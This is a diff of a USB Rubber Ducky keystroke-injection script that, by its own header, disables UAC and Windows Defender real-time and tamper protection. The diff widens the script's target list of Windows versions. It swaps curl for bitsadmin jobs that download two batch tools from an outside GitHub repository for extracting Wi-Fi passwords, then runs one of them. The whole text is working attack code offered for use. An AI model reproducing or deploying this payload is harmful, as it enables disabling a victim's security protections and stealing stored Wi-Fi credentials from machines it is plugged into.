@@ -1,8 +1,8 @@
 REM Title:         Disable_UAC_and_AV
 REM Description    Disable UAC and download py script to disable Realtime and tamper protection
 REM Author:        FX17
-REM Version:       2.0
-REM Target:        Windows 10
+REM Version:       3.0
+REM Target:        Windows 7/8/10/11
 REM Attackmodes:   HID
 
 DELAY 1000
@@ -87,12 +87,26 @@ STRING cd Documents
 ENTER
 DELAY 500
 REM Download the yoinking tools
-STRING curl --output "Password Collection.bat" -OL https://raw.githubusercontent.com/Keiranos/WiFi-Password-Extract/main/Pass%20collection.bat
+STRING bitsadmin /create DuckyCode
+DELAY 500
 ENTER
-DELAY 2000
-STRING curl --output "SSIDYoink.bat" -OL https://raw.githubusercontent.com/Keiranos/WiFi-Password-Extract/main/SSIDYoink.bat
+DELAY 500
+STRING bitsadmin /addfile DuckyCode https://raw.githubusercontent.com/Keiranos/WiFi-Password-Extract/main/Pass%20collection.bat "%cd%\Password Collection.bat"
+DELAY 500
 ENTER
-DELAY 200
+DELAY 500
+STRING bitsadmin /addfile DuckyCode https://raw.githubusercontent.com/Keiranos/WiFi-Password-Extract/main/SSIDYoink.bat "%cd%\SSIDYoink.bat"
+DELAY 500
+ENTER
+DELAY 500
+STRING bitsadmin /resume DuckyCode
+DELAY 1000
+ENTER
+DELAY 1000
+STRING bitsadmin /complete DuckyCode
+DELAY 500
+ENTER
+DELAY 1000
 STRING SSIDYoink.bat
 ENTER
 DELAY 1000
